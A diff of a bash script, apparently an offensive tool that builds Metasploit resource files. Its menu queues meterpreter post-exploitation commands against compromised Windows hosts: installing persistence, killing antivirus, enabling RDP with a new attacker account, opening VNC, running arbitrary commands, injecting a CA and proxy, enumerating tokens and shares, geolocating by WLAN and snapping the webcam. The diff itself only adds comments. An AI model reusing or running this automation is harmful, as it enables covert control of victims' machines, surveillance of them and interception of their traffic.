@@ -452,38 +452,41 @@ function autoscript {
 			echo -ne "***"
 			read choose_script
 			case $choose_script in
-			1) 
+			1) 		# Persistence
 			   echo -ne "$Newport"
 			   read newLPORT
 			   echo "run exploits/windows/local/persistence LPORT=$newLPORT" >> $rcs
 			   echo -e "=====> OK <=====";;
-			2) migrate;;
-			3)
+			2) 		# migrate
+			   migrate;;
+			3)		# kill Antivirus
 			   echo "run killav" >> $rcs
 			   echo -e "=====> OK <=====";;	
-		        4)  echo -ne "$use"
-				read Username
+		        4) 		# Enable RDP
+			   echo -ne "$use"
+			   read Username
 			   echo -ne "$pass"
-				read Password
+			   read Password
 			   echo "run getgui -e" >> $rcs
 			   echo "run getgui -u $Username -p $Password" >> $rcs
-			   echo -e "=====> OK <=====";;	
-			5)
+			   echo -e "=====> OK <=====";;
+			5)		# Enable VNC
 			   echo "run vnc" >> $rcs
 			   echo "run vnc" >> $rcs
 			   echo -e "=====> OK <=====";;
-			6) 
+			6) 		# Check vmware
 			   echo "run post/windows/gather/checkvm" >> $rcs
 			   echo -e "=====> OK <=====";;
-			7) 
+			7) 		# Change Wallpaper
 			   echo -ne "$Path_wallpaper"
 			   read path_wallpaper
 			   echo "run post/multi/manage/set_wallpaper WALLPAPER_FILE=$path_wallpaper" >> $rcs
 			   echo -e "=====> OK <=====";;			   
-			8) read auto_command
+			8) 		# Auto run COMMAND
+			   read auto_command
 			   echo "run post/multi/general/execute COMMAND=$auto_command" >> $rcs
 			   echo -e "=====> OK <=====";;
-			9) 
+			9) 		# Auto Add Proxy and Trust CA 
 			   echo -ne "$input_path_lfile"
 			   read path_lfile
 			   echo -ne "$input_path_rfile"
@@ -498,33 +501,33 @@ function autoscript {
 			   echo "run post/multi/manage/upload_injectCA LFILE=$path_lfile RFILE=$rfile ProxyServer=$proxy ProxyPort=$port" >> $rcs
 			fi
 			   echo -e "=====> OK <=====";;
-			10) 
+			10) 		# OS environment
 			   echo "run post/multi/gather/env" >> $rcs
 			   echo -e "=====> OK <=====";;
-			11) 
+			11) 		# Tokens Enumerate	
 			   echo "run post/windows/gather/enum_tokens" >> $rcs
 			   echo -e "=====> OK <=====";;
-			12) 
+			12) 		# Shares Enum
 			   echo "run post/windows/gather/enum_shares" >> $rcs
 			   echo -e "=====> OK <=====";;
-			13) 
+			13)  		# Enum APPs
 			   echo "run post/windows/gather/enum_applications" >> $rcs
 			   echo -e "=====> OK <=====";;
-			14) 
+			14) 		# Powershell Enum
 			   echo "run post/windows/gather/enum_powershell_env" >> $rcs
 			   echo -e "=====> OK <=====";;
-			15) 
+			15) 		# Exploit Suggester
 			   echo "run post/multi/recon/local_exploit_suggester" >> $rcs
 			   echo -e "=====> OK <=====";;	
-			16) 
+			16) 		# Wlan Geolocate 
 			   echo "run post/multi/gather/wlan_geolocate" >> $rcs
 			   echo -e "=====> OK <=====";;
-			17)
+			17)		# Play Youtube
 			   echo -ne "$Path_youtube"
 			   read path_youtube
 			   echo "run post/multi/manage/play_youtube VID=$path_youtube" >> $rcs
 			   echo -e "=====> OK <=====";;
-			18)
+			18)		# Snap webcam
 			   echo -ne "$Quality"
 			   read QuaLiTy
 			   echo "run post/windows/manage/webcam QUALITY=$QuaLiTy" >> $rcs
